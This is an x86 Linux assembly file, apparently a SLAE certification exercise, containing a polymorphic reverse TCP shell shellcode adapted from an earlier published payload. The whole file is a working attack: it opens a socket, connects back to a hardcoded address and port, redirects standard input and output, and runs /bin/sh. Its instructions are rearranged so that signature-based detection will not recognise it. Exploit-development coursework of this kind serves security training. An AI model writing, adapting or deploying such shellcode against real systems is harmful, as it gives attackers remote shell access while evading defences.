;----------------------------------------------------------------
;
;  poly-shellcode-883.nasm
;  by Michael Born (@blu3gl0w13)
;  Student ID: SLAE-744
;  Date: September 25, 2016
;  Free to use and distribute as necessary
;
;  Original Title:    Shell Reverse TCP Shellcode - 74 bytes
;  Platform: Linux/x86
;  Date:     2014-07-25
;  Original Author:   Julien Ahrens (@MrTuxracer)
;  Original Author Website:  http://www.rcesecurity.com 
;
;-----------------------------------------------------------------

global _start


section .text

_start:

   ; socketcall(socket, *args)
;  push   0x66
;  pop    eax
;  push   0x1
;  pop    ebx
;  xor    edx,edx
;  push   edx
;  push   ebx
;  push   0x2
;  mov    ecx,esp
;  int    0x80



   ;poly-socketcall(socket,*args)

	xor eax, eax
	mov ebx, eax
	mov edx, eax
	mov al, 0x33
	add ebx, 0x6
	push ebx
	sub ebx, 0x5
	push ebx
	add ebx, 0x1
	push ebx
	xor ecx, ecx
	mov ecx, esp
	dec ebx
	add eax, 0x33
	int 0x80
	

   ; socketcall(connect, *args)
  xchg   edx,eax
  mov    al,0x66
  push DWORD 0x101017f		;ip: 127.1.1.1
  push WORD 0x3905		;port: 1337
  inc    ebx
  push   bx
  mov    ecx,esp
  push   0x10
  push   ecx
  push   edx
  mov    ecx,esp
  inc    ebx
  int    0x80




   ; syscall dup2
  push   0x2
  pop    ecx
  xchg   edx,ebx

loop:

  mov    al,0x3f
  int    0x80
  dec    ecx
  jns short loop

   ; execve /bin//sh

;  mov    al,0xb
;  inc    ecx
;  mov    edx,ecx
;  push   edx
;  push   0x68732f2f
;  push   0x6e69622f
;  mov    ebx,esp
;  int    0x80


	; poly-execve /bin//sh

	push 0xf
	pop eax
	push 0x1
	pop ecx
	sub eax, 0x4
	dec ecx
	xor edx, edx
	mov [esp -4], edx
	sub esp, 0x4
	push 0x46510d0d
	pop ecx
	add ecx, 0x22222222
	push ecx
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	int 0x80
